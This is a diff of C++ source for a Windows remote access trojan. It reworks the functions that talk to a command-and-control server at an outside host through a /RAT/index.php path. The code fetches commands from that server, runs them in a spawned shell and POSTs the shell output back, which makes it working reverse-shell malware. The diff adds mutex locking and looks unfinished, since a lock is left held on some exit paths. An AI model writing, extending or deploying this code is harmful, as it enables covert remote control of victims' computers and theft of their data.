@@ -5,6 +5,7 @@
 #include <string>
 #include <thread>
 #include <sstream>                                                              // Include for stringstream
+#include <mutex>
 
 using namespace std;
 #pragma comment(lib, "ws2_32.lib")
@@ -13,6 +14,9 @@ using namespace std;
 HANDLE hChildStdOutRead, hChildStdOutWrite;                                     // stdout
 HANDLE hChildStdInRead, hChildStdInWrite;                                       // stdin
 bool connected = false;
+
+std::mutex mtx;
+std::mutex socketMutex; 
 /////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 bool socket_setup(SOCKET &clientSocket);
 void safe_closesocket(SOCKET &clientSocket);
@@ -104,7 +108,7 @@ int main()
                         cout << "mark the file read [switch] inside default" << "->\n";
                         cout << receive_data(sock,"from_server.txt") << endl;
 
-                        send_data(sock,"from_server.txt","`");                                                //mark the file read(switch)
+                        //send_data(sock,"from_server.txt","`");                                                //mark the file read(switch)
                         
                         
                         break;
@@ -163,139 +167,149 @@ void give_command(const std::string &command)
 
 void send_data(SOCKET &clientSocket, const string &filename ,const string &data)
 {
-    socket_setup(clientSocket);
-
-    string whole_data = filename+data;
-    string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
-    httpRequest += "Host: arth.imbeddex.com\r\n";
-    httpRequest += "Content-Length: " + to_string(whole_data.length()) + "\r\n";
-    httpRequest += "Content-Type: application/octet-stream\r\n";
-    httpRequest += "Connection: close\r\n\r\n";
-    httpRequest += whole_data;                                                                // Append the actual data
-
-    int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
-    if (bytesSent == SOCKET_ERROR)
     {
-        int error = WSAGetLastError();
-        cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-    }
+        lock_guard<mutex> lock1(socketMutex); 
+        
+        socket_setup(clientSocket);
 
-////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
+        string whole_data = filename+data;
+        string httpRequest = "POST /RAT/index.php HTTP/1.1\r\n";
+        httpRequest += "Host: arth.imbeddex.com\r\n";
+        httpRequest += "Content-Length: " + to_string(whole_data.length()) + "\r\n";
+        httpRequest += "Content-Type: application/octet-stream\r\n";
+        httpRequest += "Connection: close\r\n\r\n";
+        httpRequest += whole_data;                                                                // Append the actual data
 
-    char buffer[4096]; // Increased buffer size
-    string receivedData;
-    int bytesReceived;
 
-    do {
-        bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
-
-        if (bytesReceived > 0) {
-            buffer[bytesReceived] = '\0';
-            receivedData += buffer; // Append to the received data
-        } else if (bytesReceived == 0) {
-            cerr << "Connection closed by server." << endl;
-            break; // Exit the loop on clean close
-        } else {
+        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
+        if (bytesSent == SOCKET_ERROR)
+        {
             int error = WSAGetLastError();
-            if (error != WSAECONNRESET) {
-                cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-            }
-            break; // Exit loop on error
+            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
         }
-    } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
+    
+        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
 
-    //cout << "\n\nReceived: " << receivedData << endl;
+        char buffer[4096]; // Increased buffer size
+        string receivedData;
+        int bytesReceived;
 
-    ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
+        do {
+            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
 
-    safe_closesocket(clientSocket);
+            if (bytesReceived > 0) {
+                buffer[bytesReceived] = '\0';
+                receivedData += buffer; // Append to the received data
+            } else if (bytesReceived == 0) {
+                cerr << "Connection closed by server." << endl;
+                break; // Exit the loop on clean close
+            } else {
+                int error = WSAGetLastError();
+                if (error != WSAECONNRESET) {
+                    cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
+                }
+                break; // Exit loop on error
+            }
+        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
+
+        //cout << "\n\nReceived: " << receivedData << endl;
+
+        ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
+
+        safe_closesocket(clientSocket);
+    }
 }
 
 string receive_data(SOCKET &clientSocket, const string &filename)
 {
-    socket_setup(clientSocket);
-
-    string httpRequest = "GET /RAT/"+filename+" HTTP/1.1\r\n";
-    httpRequest += "Host: arth.imbeddex.com\r\n";
-    httpRequest += "Connection: close\r\n\r\n";
-
-    //cout<< httpRequest<<endl;
-
-    int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
-    if (bytesSent == SOCKET_ERROR)
     {
-        int error = WSAGetLastError();
-        cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-    }
+        lock_guard<mutex> lock1(socketMutex);
 
-    /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+        socket_setup(clientSocket);
 
-    char buffer[4096]; // Increased buffer size
-    string receivedData;
-    int bytesReceived;
+        string httpRequest = "GET /RAT/"+filename+" HTTP/1.1\r\n";
+        httpRequest += "Host: arth.imbeddex.com\r\n";
+        httpRequest += "Connection: close\r\n\r\n";
 
-    do {
-        bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
+        //cout<< httpRequest<<endl;
 
-        if (bytesReceived > 0) {
-            buffer[bytesReceived] = '\0';
-            receivedData += buffer; // Append to the received data
-        } else if (bytesReceived == 0) {
-            cerr << "Connection closed by server." << endl;
-            break; // Exit the loop on clean close
-        } else {
-            int error = WSAGetLastError();
-            if (error != WSAECONNRESET) {
-                cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
-            }
-            break; // Exit loop on error
-        }
-    } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
-
-    //cout << "\n\nReceived: \n" << receivedData << endl;
-
-    ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
-
-    // Robust HTTP response parsing
-    size_t headerEnd = receivedData.find("\r\n\r\n");
-    if (headerEnd == string::npos) {
-        cerr << "Invalid HTTP receivedData: No header/body separator found." << endl;
-        return "";
-    }
-
-    string body = receivedData.substr(headerEnd + 4);
-
-    //Handle chunked transfer encoding (if present)
-    size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
-    if (transferEncodingPos != string::npos)
-    {
-        string unchunkedBody;
-        istringstream bodyStream(body);
-        string chunkLengthStr;
-
-        while (getline(bodyStream, chunkLengthStr))
+        int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
+        if (bytesSent == SOCKET_ERROR)
         {
-            if (chunkLengthStr.empty() || chunkLengthStr == "\r") continue;
-
-            size_t chunkSize;
-            stringstream ss;
-            ss << hex << chunkLengthStr;
-            ss >> chunkSize;
-
-            if (chunkSize == 0) break; // End of chunked data
-
-            string chunkData(chunkSize, '\0');
-            bodyStream.read(&chunkData[0], chunkSize);
-
-            unchunkedBody += chunkData;
-            bodyStream.ignore(2); // Consume CRLF after chunk
+            int error = WSAGetLastError();
+            cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
         }
-        body = unchunkedBody;
-    }
-    safe_closesocket(clientSocket);
 
-    //send_data(clientSocket, "from_server.txt", "`");
-    return body;
+        /////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+        char buffer[4096]; // Increased buffer size
+        string receivedData;
+        int bytesReceived;
+
+        do {
+            bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0); // Leave space for null terminator
+
+            if (bytesReceived > 0) {
+                buffer[bytesReceived] = '\0';
+                receivedData += buffer; // Append to the received data
+            } else if (bytesReceived == 0) {
+                cerr << "Connection closed by server." << endl;
+                break; // Exit the loop on clean close
+            } else {
+                int error = WSAGetLastError();
+                if (error != WSAECONNRESET) {
+                    cerr << "Receive failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
+                }
+                break; // Exit loop on error
+            }
+        } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
+
+        //cout << "\n\nReceived: \n" << receivedData << endl;
+
+        ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
+
+        // Robust HTTP response parsing
+        size_t headerEnd = receivedData.find("\r\n\r\n");
+        if (headerEnd == string::npos) {
+            cerr << "Invalid HTTP receivedData: No header/body separator found." << endl;
+            return "";
+        }
+
+        string body = receivedData.substr(headerEnd + 4);
+
+        //Handle chunked transfer encoding (if present)
+        size_t transferEncodingPos = receivedData.find("Transfer-Encoding: chunked");
+        if (transferEncodingPos != string::npos)
+        {
+            string unchunkedBody;
+            istringstream bodyStream(body);
+            string chunkLengthStr;
+
+            while (getline(bodyStream, chunkLengthStr))
+            {
+                if (chunkLengthStr.empty() || chunkLengthStr == "\r") continue;
+
+                size_t chunkSize;
+                stringstream ss;
+                ss << hex << chunkLengthStr;
+                ss >> chunkSize;
+
+                if (chunkSize == 0) break; // End of chunked data
+
+                string chunkData(chunkSize, '\0');
+                bodyStream.read(&chunkData[0], chunkSize);
+
+                unchunkedBody += chunkData;
+                bodyStream.ignore(2); // Consume CRLF after chunk
+            }
+            body = unchunkedBody;
+        }
+        safe_closesocket(clientSocket);
+
+        //send_data(clientSocket, "from_server.txt", "`");
+        return body;
+
+    }
 }
 
 void rev_shell(SOCKET &clientSocket)
@@ -345,21 +359,28 @@ void rev_shell(SOCKET &clientSocket)
         DWORD bytesRead;
 
         while (!processFinished.load())
-        {
-            if (ReadFile(hChildStdOutRead, buffer, bufferSize, &bytesRead, NULL))
-            {
-                if (bytesRead > 0) 
+        {            
+
+            //{
+                //lock_guard<mutex> lock1(socketMutex);
+                mtx.lock();
+                if (ReadFile(hChildStdOutRead, buffer, bufferSize, &bytesRead, NULL))
                 {
-                    buffer[bytesRead] = '\0';
-                    cout << buffer;
-                    send_data(clientSocket, "from_client.txt" ,buffer);
+                    if (bytesRead > 0) 
+                    {
+                        buffer[bytesRead] = '\0';
+                        cout << buffer;
+                        send_data(clientSocket, "from_client.txt" ,buffer);
+                    }
+                } 
+                else if (GetLastError() == ERROR_BROKEN_PIPE)
+                {
+                    // End of data
+                    break;
                 }
-            } 
-            else if (GetLastError() == ERROR_BROKEN_PIPE)
-            {
-                // End of data
-                break;
-            }
+
+                mtx.unlock();
+            //}
             Sleep(1000); // Sleep for a short time to prevent 100% CPU usage
         } 
     });
@@ -370,16 +391,28 @@ void rev_shell(SOCKET &clientSocket)
         string cmd;
         while (!processFinished.load())  // Check if process is finished
         {
-            cmd = receive_data(clientSocket, "from_server.exe");
-            send_data(clientSocket,"from_server.txt","`");
-            if (cmd == "exit")
-            {
-                processFinished.store(true); // Signal to stop reading thread
-                break;
-            }
+           //{ 
+                //lock_guard<mutex> lock1(socketMutex);
+                mtx.lock();
 
-            // Send the command to the child process's stdin
-            give_command(cmd);
+                if(receive_data(clientSocket,"from_server.txt")[0] == '`')
+                {
+                    Sleep(1000);
+                    cout<< "waiting for rev shell data " << endl;
+                }
+                cmd = receive_data(clientSocket, "from_server.exe");
+                send_data(clientSocket,"from_server.txt","`");
+                if (cmd == "exit")
+                {
+                    processFinished.store(true); // Signal to stop reading thread
+                    break;
+                }
+
+                // Send the command to the child process's stdin
+                give_command(cmd);
+
+                mtx.unlock();
+            //}
             Sleep(1000); // Sleep for a short time to prevent 100% CPU usage
         }
     });
